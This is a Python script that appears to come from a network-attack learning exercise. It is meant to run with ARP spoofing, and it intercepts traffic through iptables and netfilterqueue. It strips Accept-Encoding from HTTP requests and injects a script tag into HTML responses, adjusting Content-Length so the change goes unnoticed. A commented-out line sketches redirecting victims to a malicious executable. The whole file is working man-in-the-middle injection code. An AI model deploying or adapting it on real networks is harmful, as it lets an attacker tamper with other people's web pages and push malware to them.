#!/usr/bin/env python3
#------------------------------------------------------
# to be run concurrently with arp_spoof,iptables config
#------------------------------------------------------
import scapy.all as scapy
import netfilterqueue
import os
import re
#import scapy_http.http
#from scapy_http import http
import argparse
import time
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-m","--mode",help="remote or local mode") # -- mode R
    options= parser.parse_args()
    return options

false_target_ip ="10.0.2.4" # index.html in local: desired (spoofed)ip to be returned by the DNS call
#
##redirect_str = "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.4/myevil.exe\n\n"
def set_load(packet,load):
    packet[scapy.Raw].load = load 
    #
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    #
    return packet
ack_list = []
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) # convert to scapy packet    
    if scapy_packet.haslayer(scapy.Raw):  # useful http requests/response data
        try: 
            load = scapy_packet[scapy.Raw].load.decode()
            #print(scapy_packet.show())
            if scapy_packet[scapy.TCP].dport == 80: # dest port = 80, hence request
                #print(scapy_packet.show())
                print("--Request")
                #print(load)
                load = re.sub('Accept-Encoding:.*?\\r\\n',"",load) # ?=non-greedy -1st occurance
            elif scapy_packet[scapy.TCP].sport == 80:   # source port = 80, hence response  
                print("..response")
                #print(load)
                inject_code="<script>alert('test');</script>"
                load = load.replace("</body>",inject_code + "</body>")
                content_length_search = re.search('(?:Content-length:\s)(\d*)',load) # 2 groups
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    #print('.....' + content_length)
                    new_content_length = int(content_length) + len(inject_code)
                    load = load.replace(content_length,str(new_content_length))

            if load !=scapy_packet[scapy.Raw].load:
                #print("changed load..\n" + load)
                new_packet = set_load(scapy_packet,load)
                packet.set_payload(bytes(new_packet))        
        except UnicodeDecodeError:
            pass
#                    
    packet.accept()
#main
if __name__ == "__main__":
    QUEUE_NUM = 0
    options = get_arguments() # remote or local
    # insert the iptables FORWARD rule
    if options.mode == 'R' :
        print('remote option')
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    else: # local mode
        print('local option')
        os.system("iptables -I INPUT -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
        os.system("iptables -I OUTPUT -j NFQUEUE --queue-num {}".format(QUEUE_NUM))

    # instantiate the netfilter queue
    queue = netfilterqueue.NetfilterQueue()
    try:
        # bind the queue number to our callback `process_packet`
        # and start it
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        # if want to exit, make sure we
        # remove that rule we just inserted, going back to normal.
        print("flushing IP tables")
        os.system("iptables --flush")
####
# queue = netfilterqueue.NetfilterQueue()
# queue.bind(0,process_packet)
# queue.run()   